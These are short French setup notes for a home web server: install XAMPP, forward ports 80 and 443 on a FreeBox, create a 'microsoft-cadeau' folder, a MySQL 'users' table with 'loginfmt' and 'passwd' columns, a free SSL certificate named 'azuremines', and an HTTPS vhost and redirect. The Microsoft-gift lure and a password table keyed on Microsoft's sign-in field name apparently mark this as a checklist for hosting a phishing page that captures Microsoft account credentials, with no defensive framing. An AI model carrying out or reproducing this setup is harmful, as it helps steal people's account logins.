TtiNkY WiNky
installer xampp
lancer apache et mysql
rediriger les ports 80 et 443 dans la FreeBox
créer le répertoire microsoft-cadeau dans htdocs

créer une base de données mysql avec 3 colones et une table users
- id		int		11		cocher Primary
- loginfmt	varchar		100
- passwd	varchar		100

générer un certificat
- https://www.sslforfree.com/
- créer un répertoire dans /xampp/apache/conf/ --> crt
- mettre dedans : azuremines.crt et azuremines.key
- aller dans /xampp/apache/conf/extra/httpd-vhsts.conf
et rajouter a la fin :
<VirtualHost *:443>
  DocumentRoot "C:/xampp/htdocs/"
  ServerName localhost
  SSLEngine on
  SSLCertificateFile "conf/crt/azuremines.crt"
  SSLCertificateKeyFile "conf/crt/azuremines.key"
  <Directory "C:/xampp/htdocs/">
  Options All
  AllowOverride All
  Require all granted
  </Directory>
</VirtualHost>

- rajouter un .htaccess dans le htdocs
RewriteEngine On
RewriteCond %{HTTPS} !=on
RewriteRule ^/?(.*) https://%{SERVER_NAME}/$1 [R,L]